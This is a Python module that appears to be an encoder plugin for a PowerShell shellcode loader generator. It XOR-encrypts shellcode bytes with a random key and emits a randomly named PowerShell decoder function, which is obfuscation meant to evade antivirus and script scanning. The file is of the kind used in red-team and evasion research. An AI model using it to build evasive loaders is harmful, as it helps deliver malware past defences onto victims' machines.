import random
import string
from ps1.utils.formatters import bytes_to_ps1
import os

class XOREncrypt:

    def __init__(self, arguments: dict) -> None:
        if 'key' in arguments:
            self.key = arguments['key'].encode()
        else:
            self.key = os.urandom(16)
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def encode(self, plaintext: bytes) -> bytes:
        self.ciphertextSize = len(plaintext)
        return bytes(plaintext[i] ^ self.key[i % len(self.key)] for i in range(0, len(plaintext)))

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{{shellcode}} | {self.name}')

    def codeblock(self) -> str:
        return f"""
function {self.name} {{
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory, ValueFromPipeline)]
        [byte[]]$CipherBytes
    )
    begin {{
        $buffer = [System.Collections.Generic.List[byte]]::new()
    }}
    process {{
        $buffer.AddRange($CipherBytes)
    }}
    end {{
        {bytes_to_ps1(self.key, 'Key')}
        $cipher = $buffer.ToArray()
        $output = [byte[]]::new($cipher.Length)
        for ($i = 0; $i -lt $cipher.Length; $i++) {{
            $output[$i] = $cipher[$i] -bxor $Key[$i % $Key.Length]
        }}
        return $output
    }}
}}
"""